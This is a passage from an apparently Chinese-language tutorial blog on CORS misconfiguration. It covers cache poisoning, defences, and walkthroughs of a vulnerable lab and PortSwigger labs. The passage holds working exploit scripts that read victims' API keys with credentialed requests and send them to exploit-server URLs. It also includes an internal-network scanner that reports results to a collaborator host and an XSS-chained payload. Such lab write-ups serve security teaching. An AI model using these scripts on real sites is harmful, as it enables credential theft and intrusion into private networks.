<span class="hljs-string">`</span><span class="hljs-string">``</span>

构造存在恶意的<span class="hljs-variable constant_">XSS</span>有效负载页面，诱使受害者触发。

<span class="hljs-string">``</span><span class="hljs-string">`JavaScript</span>
<span class="hljs-string">var req = new XMLHttpRequest(); </span>
<span class="hljs-string">req.onload = reqListener;</span>
<span class="hljs-string">req.open('get','http://www.target.local/login',true); </span>
<span class="hljs-string">req.setRequestHeader('X-User', '&lt;svg/onload=alert(1)&gt;');</span>
<span class="hljs-string">req.send(); </span>
<span class="hljs-string">function reqListener() { </span>
<span class="hljs-string">location='http://www.target.local/login'; </span>
<span class="hljs-string">}</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

<span class="hljs-number">1.</span> 攻击方式<span class="hljs-number">3</span>：服务器端缓存中毒
   利用<span class="hljs-variable constant_">CORS</span>的错误配置注入任意<span class="hljs-variable constant_">HTTP</span>头部，将其保存在服务器端缓存中，可用于构造存储类型<span class="hljs-variable constant_">XSS</span>。
   利用条件：存在服务器端缓存，能够反射<span class="hljs-string">`Origin`</span>头部，不会检查<span class="hljs-string">`Origin`</span>头部中的特殊字符，如<span class="hljs-string">`\r`</span>
   利用方式：攻击<span class="hljs-variable constant_">IE</span> / <span class="hljs-title class_">Edge</span>用户（<span class="hljs-variable constant_">IE</span> / <span class="hljs-title class_">Edge</span>使用<span class="hljs-string">`\r`</span>作为的<span class="hljs-variable constant_">HTTP</span>标题段的终结符）

请求包

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">GET / HTTP/1.1 </span>
<span class="hljs-string">Origin: z[0x0d]Content-Type: text/html; charset=UTF-7</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

回车（<span class="hljs-variable constant_">CR</span>）：<span class="hljs-variable constant_">ASCII</span>码：<span class="hljs-string">'\r'</span> ，十六进制：<span class="hljs-number">0x0d</span>

响应包

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">HTTP/1.1 200 OK </span>
<span class="hljs-string">Access-Control-Allow-Origin: z </span>
<span class="hljs-string">Content-Type: text/html; charset=UTF-7</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

如果攻击者能提前发送畸形的<span class="hljs-string">`Origin`</span>消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为<span class="hljs-string">`UTF-7`</span>，可引发<span class="hljs-variable constant_">XSS</span>中断。

#### 类型<span class="hljs-number">2</span>

<span class="hljs-number">1.</span>描述

在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。

<span class="hljs-number">2.</span>挖掘

同上

<span class="hljs-number">3.</span>利用

<span class="hljs-number">1</span>,交互式xss。通过<span class="hljs-variable constant_">CORS</span>，绕过一些反会话劫持的方法，如<span class="hljs-variable constant_">HTTP</span>-<span class="hljs-title class_">Only</span>限制的cookie，绑定<span class="hljs-variable constant_">IP</span>地址的会话<span class="hljs-variable constant_">ID</span>等，劫持用户会话。

<span class="hljs-number">2</span>,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。

## <span class="hljs-number">0x10</span> 预防<span class="hljs-variable constant_">CORS</span>漏洞

<span class="hljs-variable constant_">CORS</span>漏洞主要是由于配置错误而引起的。所以，预防漏洞变成了一个配置问题。下面介绍了一些针对<span class="hljs-variable constant_">CORS</span>攻击的有效防御措施。

<span class="hljs-number">1.</span> 正确配置跨域请求
   如果<span class="hljs-title class_">Web</span>资源包含敏感信息，则应在<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>标头中正确指定来源。
<span class="hljs-number">2.</span> 只允许信任的网站
   看起来似乎很明显，但是<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>中指定的来源只能是受信任的站点。特别是，使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。
<span class="hljs-number">3.</span> 避免将<span class="hljs-literal">null</span>列入白名单
   避免使用标题<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-literal">null</span>。来自内部文档和沙盒请求的跨域资源调用可以指定<span class="hljs-literal">null</span>来源。应针对私有和公共服务器的可信来源正确定义<span class="hljs-variable constant_">CORS</span>头。
<span class="hljs-number">4.</span> 避免在内部网络中使用通配符
   避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。
<span class="hljs-number">5.</span> <span class="hljs-variable constant_">CORS</span>不能替代服务器端安全策略
   <span class="hljs-variable constant_">CORS</span>定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的<span class="hljs-variable constant_">CORS</span>之外，<span class="hljs-title class_">Web</span>服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。

## <span class="hljs-number">0x11</span> <span class="hljs-variable constant_">CORS</span>靶场练习

该靶场内置了<span class="hljs-number">3</span>个 <span class="hljs-variable constant_">CORS</span> 的漏洞场景

- 场景一：信任任意 <span class="hljs-title class_">Origin</span> 源
- 场景二：正则表达式检测 <span class="hljs-title class_">Origin</span> 源
- 场景三：信任任意 <span class="hljs-literal">null</span> 源![image-<span class="hljs-number">20230510214108156</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510214108156.</span>png)

 漏洞检测: 一般情况下，修改请求包 <span class="hljs-title class_">Header</span> 中的 <span class="hljs-title class_">Origin</span> 字段为任意域名或者为 <span class="hljs-literal">null</span> 的方式去检测该漏洞是否存在。

#### 场景一：信任任意 <span class="hljs-title class_">Origin</span> 源

应用程序接受来自任何 <span class="hljs-title class_">Origin</span> 的 <span class="hljs-variable constant_">CORS</span> 请求。该代码将 <span class="hljs-title class_">Origin</span> 值放在 <span class="hljs-variable constant_">HTTP</span> 响应头 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span> 中。现在，此配置将允许来自任何 <span class="hljs-title class_">Origin</span> 的任何脚本向应用程序发出 <span class="hljs-variable constant_">CORS</span> 请求。<span class="hljs-title class_">Web</span> 浏览器将执行标准的 <span class="hljs-variable constant_">CORS</span> 请求检查，来自恶意域的脚本将能够窃取数据。

应用程序接受 <span class="hljs-title class_">Origin</span> 标头中指定的任何值。
![image-<span class="hljs-number">20230510215219591</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215219591.</span>png)

可以看到箭头处的域名,是任意的,而该网站都允许域名发出请求并回显(origin处是我自己添加的)

#### 场景二：正则表达式检测 <span class="hljs-title class_">Origin</span> 源

应用程序已实施 <span class="hljs-variable constant_">CORS</span> 策略并对列入白名单的域/子域执行“正则表达式”检查。在这种情况下，应用程序在代码中具有弱正则表达式实现，它只检查 <span class="hljs-variable constant_">HTTP</span> 请求 <span class="hljs-title class_">Origin</span> 标头中任何位置的域名 b0x.<span class="hljs-property">com</span> 的存在。如果 <span class="hljs-variable constant_">HTTP</span> 标头 <span class="hljs-title class_">Origin</span> 的值为 inb0x.<span class="hljs-property">com</span> 或 b0x.<span class="hljs-property">comlab</span>.<span class="hljs-property">com</span>，正则表达式会将其标记为通过。这种错误配置将导致跨源共享数据。

**应用程序信任列入白名单的 <span class="hljs-title class_">Origin</span>。**
![image-<span class="hljs-number">20230510215728867</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215728867.</span>png)

**应用程序不允许任何任意来源, 可以看到下图右侧没有<span class="hljs-variable constant_">CORS</span>头**

![image-<span class="hljs-number">20230510215801410</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215801410.</span>png)

应用程序弱正则表达式允许在域名开头具有白名单域字符串的 <span class="hljs-title class_">Origin</span>。

![image-<span class="hljs-number">20230510215958783</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215958783.</span>png)

应用程序弱正则表达式允许在域名末尾具有白名单域字符串的 <span class="hljs-title class_">Origin</span>。

![image-<span class="hljs-number">20230510220029500</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220029500.</span>png)

#### 场景三：信任<span class="hljs-literal">null</span>源

在这种情况下，应用程序 <span class="hljs-variable constant_">HTTP</span> 响应标头 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span> 始终设置为 <span class="hljs-literal">null</span>。当用户指定 <span class="hljs-literal">null</span> 以外的任何值时，应用程序不会处理它并在 <span class="hljs-variable constant_">HTTP</span> 响应中继续反映 <span class="hljs-literal">null</span> 。允许攻击者执行漏洞利用的技巧很少，并且可以使用 <span class="hljs-variable constant_">CORS</span> 请求过滤受害者的数据。

**应用程序接受 <span class="hljs-title class_">Origin</span> 标头中指定的 <span class="hljs-literal">null</span> 值。**

![image-<span class="hljs-number">20230510220243338</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220243338.</span>png)

#### 注意事项

如果响应包 <span class="hljs-title class_">Header</span> 中为以下情况 ，则不存在漏洞。

<span class="hljs-string">``</span><span class="hljs-string">`</span>
<span class="hljs-string">Access-Control-Allow-Origin: *</span>
<span class="hljs-string">Access-Control-Allow-Credentials:true</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

![image-<span class="hljs-number">20230510220310783</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220310783.</span>png)

原因是因为浏览器会对此类情况的请求进行自动拦截，不具备漏洞利用条件。

在 <span class="hljs-variable constant_">CORS</span>-vulnerable-<span class="hljs-title class_">Lab</span> 靶场的 <span class="hljs-title class_">POCs</span> 目录下，有 <span class="hljs-variable constant_">CORS</span> 漏洞利用的脚本

以 <span class="hljs-string">`arbitrary_origin_exploit.html`</span> 为例，用文本编辑器打开该脚本文件，找到如下代码并根据实际应用场景进行修改

<span class="hljs-string">``</span><span class="hljs-string">``</span>js
&lt;script&gt;
<span class="hljs-comment">//向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params"></span>) {
 <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
 xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
   <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) {
     <span class="hljs-keyword">var</span> all = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;
     <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"load"</span>).<span class="hljs-property">innerHTML</span>= all; <span class="hljs-comment">// 分割打印被盗取的 HTTP 响应</span>
     
      }
 };
 xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://192.168.126.6/CORS/arbitrary_origin.php"</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//将 URL 更改为错误配置 CORS 策略的 URL</span>
 xhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">"Accept"</span>, <span class="hljs-string">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8"</span>);
 xhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">"Accept-Language"</span>, <span class="hljs-string">"en-US,en;q=0.5"</span>);
 xhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;
 xhttp.<span class="hljs-title function_">send</span>();
}

&lt;/script&gt;</code></pre>
</li>
</ol>
<p>将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510221238392.png" alt="image-20230510221238392"></p>
<p>这里我复现不出来…</p>
<h2 id="0x12-bp官网的靶场练习">0x12 bp官网的靶场练习</h2>
<h4 id="实验一-具有基本原点反射的-cors-漏洞">实验一: 具有基本原点反射的 CORS 漏洞</h4>
<p>信息:</p>
<pre><code class="hljs plaintext">该网站具有不安全的CORS配置，因为它信任所有来源。

要解决该实验室问题，请编写一些使用 CORS 检索管理员 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，该实验就解决了。

您可以使用以下凭据登录到您自己的帐户：wiener:peter</code></pre>
<p>首先开启bp代理,同时关闭拦截,记录你浏览网页的请求</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230511001645031.png" alt="image-20230511001645031"></p>
<p>登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230511235451763.png" alt="image-20230511235451763"></p>
<p>接下来我们将其发送到重发器,验证是否有CORS漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512000128545.png" alt="image-20230512000128545"></p>
<p>如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问</p>
<p>接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中</p>
<p><a target="_blank" rel="noopener" href="https://0ac200c803b3121486c4a98700c50006">https://0ac200c803b3121486c4a98700c50006</a>: 此处换成你实验室的url即可</p>
<pre><code class="hljs js">&lt;script&gt;
    <span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
    req.<span class="hljs-property">onload</span> = reqListener;
    req.<span class="hljs-title function_">open</span>(<span class="hljs-string">'get'</span>,<span class="hljs-string">'https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails'</span>,<span class="hljs-literal">true</span>);
    req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;
    req.<span class="hljs-title function_">send</span>();

    <span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) {
        location=<span class="hljs-string">'/log?key='</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;
    };
&lt;/script&gt;</code></pre>
<p>接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512001443189.png" alt="image-20230512001443189"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512001856272.png" alt="image-20230512001856272"></p>
<p>如上图,从左到右依次点击即可</p>
<h4 id="实验室二受信任空源的cors漏洞">实验室二：受信任空源的CORS漏洞</h4>
<p>提示:</p>
<p>这个网站有一个不安全的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">CORS</a>配置，因为它信任“null”来源。</p>
<p>为了解决这个实验，编写一些JavaScript，使用CORS检索管理员的API密钥并将代码上传到漏洞利用服务器。当您成功提交管理员的API密钥时，该实验就解决了.<br>
您可以使用以下凭据登录到自己的帐户：<code>wiener:peter</code></p>
<p>同上题</p>
<p>登陆账号，单击"我的帐户"，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512002701301.png" alt="image-20230512002701301"></p>
<p>经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512003016726.png" alt="image-20230512003016726"></p>
<p>接着用iframe构造null源的请求来绕过</p>
<p>在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）</p>
<pre><code class="hljs js">&lt;iframe sandbox=<span class="hljs-string">"allow-scripts allow-top-navigation allow-forms"</span> srcdoc=<span class="hljs-string">"&lt;script&gt;</span>
<span class="hljs-string">    var req = new XMLHttpRequest();</span>
<span class="hljs-string">    req.onload = reqListener;</span>
<span class="hljs-string">    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);</span>
<span class="hljs-string">    req.withCredentials = true;</span>
<span class="hljs-string">    req.send();</span>
<span class="hljs-string">    function reqListener() {</span>
<span class="hljs-string">        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);</span>
<span class="hljs-string">    };</span>
<span class="hljs-string">&lt;/script&gt;"</span>&gt;&lt;/iframe&gt;
 
我的是：
&lt;iframe sandbox=<span class="hljs-string">"allow-scripts allow-top-navigation allow-forms"</span> srcdoc=<span class="hljs-string">"&lt;script&gt;</span>
<span class="hljs-string">    var req = new XMLHttpRequest();</span>
<span class="hljs-string">    req.onload = reqListener;</span>
<span class="hljs-string">    req.open('get','https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails',true);</span>
<span class="hljs-string">    req.withCredentials = true;</span>
<span class="hljs-string">    req.send();</span>
<span class="hljs-string">    function reqListener() {</span>
<span class="hljs-string">        location='https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key='+encodeURIComponent(this.responseText);</span>
<span class="hljs-string">    };</span>
<span class="hljs-string">&lt;/script&gt;"</span>&gt;&lt;/iframe&gt;</code></pre>
<p>注意iframe沙箱的使用，因为这会生成一个空的源请求。</p>
<p>原因如下：GPT回答</p>
<pre><code class="hljs plaintext">这里iframe沙箱为何会产生一个空的源请求？

//ChatGPT
在给定的代码中，使用了一个具有沙箱属性的 &lt;iframe&gt; 元素，它的 sandbox 属性被设置为 "allow-scripts allow-top-navigation allow-forms"。这些属性指定了一组沙箱规则，用于限制嵌入的文档的行为。

其中，allow-scripts 属性允许嵌入的文档执行脚本，allow-top-navigation 属性允许嵌入的文档导航到顶级窗口，allow-forms 属性允许嵌入的文档提交表单。

**当使用具有沙箱属性的 &lt;iframe&gt; 元素时，如果没有指定 src 属性，则会执行 srcdoc 属性的内容作为内联文档。在这种情况下，内联文档的源被视为一个空字符串。**

由于源被视为一个空字符串，因此在发出请求时，浏览器会创建一个空的初始请求，因为没有指定具体的源。这个初始请求不会导致真正的网络请求，也不会发送到服务器。因此，你观察到的是一个空的源请求。

需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。</code></pre>
<p>单击"查看漏洞利用"（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）<br>
返回到利用漏洞攻击服务器并单击"将利用漏洞攻击发送给受害者"。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512003338078.png" alt="image-20230512003338078"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512003939772.png" alt="image-20230512003939772"></p>
<p>成功!!!</p>
<h4 id="实验三-受信任的不安全协议的cors漏洞">实验三:  受信任的不安全协议的CORS漏洞</h4>
<p>提示:</p>
<p>1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。</p>
<p>2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key</p>
<p>3、已有账号：wiener:peter</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512005418526.png" alt="image-20230512005418526"></p>
<p>如上图,依旧可能存在CORS漏洞,发送到重发器验证</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512005502585.png" alt="image-20230512005502585"></p>
<p>此时将origin标头改为:</p>
<pre><code class="hljs plaintext">Origin:http://subdomain.lab-id
（lab-id 是实验室域名）
 
我的是：
Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512005624579.png" alt="image-20230512005624579"></p>
<p>如上图成功发现利用漏洞(发现其任意子域都可以访问)</p>
<p><strong>组合利用</strong><br>
打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512010238048.png" alt="image-20230512010238048"></p>
<p>接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512010433282.png" alt="image-20230512010433282"></p>
<p>在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：</p>
<pre><code class="hljs js">&lt;script&gt;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;</span>
<span class="hljs-string">	var req = new XMLHttpRequest(); </span>
<span class="hljs-string">	req.onload = reqListener; </span>
<span class="hljs-string">	req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); </span>
<span class="hljs-string">	req.withCredentials = true;</span>
<span class="hljs-string">	req.send();</span>
<span class="hljs-string">	function reqListener() {</span>
<span class="hljs-string">        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText;</span>
<span class="hljs-string">    };%3c/script&gt;&amp;storeId=1"</span>
&lt;/script&gt;
 
我的是：
&lt;script&gt;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">"http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"</span>
&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512011023038.png" alt="image-20230512011023038"></p>
<h4 id="实验四-cors漏洞与内部网络枢轴攻击">实验四: CORS漏洞与内部网络枢轴攻击</h4>
<p>提示:</p>
<p>1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。</p>
<p>2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户<code>Carlos</code>后，实验将得到解决。</p>
<p>part1:</p>
<p>需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL</p>
<pre><code class="hljs js">&lt;script&gt;
<span class="hljs-keyword">var</span> q = [], collaboratorURL = <span class="hljs-string">'http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/'</span>;
 
<span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">255</span>;i++) {
	q.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">url</span>) {
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">wait</span>) {
			<span class="hljs-title function_">fetchUrl</span>(url, wait);
		}
	}(<span class="hljs-string">'http://192.168.0.'</span>+i+<span class="hljs-string">':8080'</span>));
}
 
<span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">20</span>;i++){
	<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>)q.<span class="hljs-title function_">shift</span>()(i*<span class="hljs-number">100</span>);
}
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, wait</span>) {
	<span class="hljs-keyword">var</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>(), signal = controller.<span class="hljs-property">signal</span>;
	<span class="hljs-title function_">fetch</span>(url, {signal}).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> {
		location = collaboratorURL + <span class="hljs-string">'?ip='</span>+url.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^http:\/\//</span>,<span class="hljs-string">''</span>)+<span class="hljs-string">'&amp;code='</span>+<span class="hljs-built_in">encodeURIComponent</span>(text)+<span class="hljs-string">'&amp;'</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
	}))
	.<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
		<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>) {
			q.<span class="hljs-title function_">shift</span>()(wait);
		}
	});
	<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> {
		controller.<span class="hljs-title function_">abort</span>();
		<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>) {
			q.<span class="hljs-title function_">shift</span>()(wait);
		}
	}, wait);
}
&lt;/script&gt;</code></pre>
<pre><code class="hljs plaintext">上述代码解析：GPT回答
解析：

1.定义了一个空数组 q 用于存储异步请求的队列。

2.定义了一个 collaboratorURL 变量，指定了协作者的 URL。

3.使用一个 for 循环从 1 到 255，生成了一系列函数，并将这些函数添加到队列 q 中。每个生成的函数将调用 fetchUrl(url, wait) 函数，并将不同的 IP 地址组合成一个 URL。

4.使用另一个 for 循环从 1 到 20，不断从队列 q 中取出函数，并调用它们，传递不同的等待时间参数。

5.定义了一个 fetchUrl(url, wait) 函数，用于发起异步请求。

6.创建了一个 AbortController 对象和对应的 signal 信号。

7.使用 fetch 函数发送一个 GET 请求到指定的 URL，并指定 signal 作为参数传递给请求选项。

8.当请求成功返回时，将响应的文本内容作为参数拼接到指定的协作者 URL，并进行重定向。

9.如果请求失败，则判断队列 q 是否还有剩余的函数，如果有，则取出下一个函数并执行。

10.使用 setTimeout 设置一个超时定时器，当超时时，终止请求并执行与上述相同的处理逻辑。

这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。</code></pre>
<p>在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。</p>
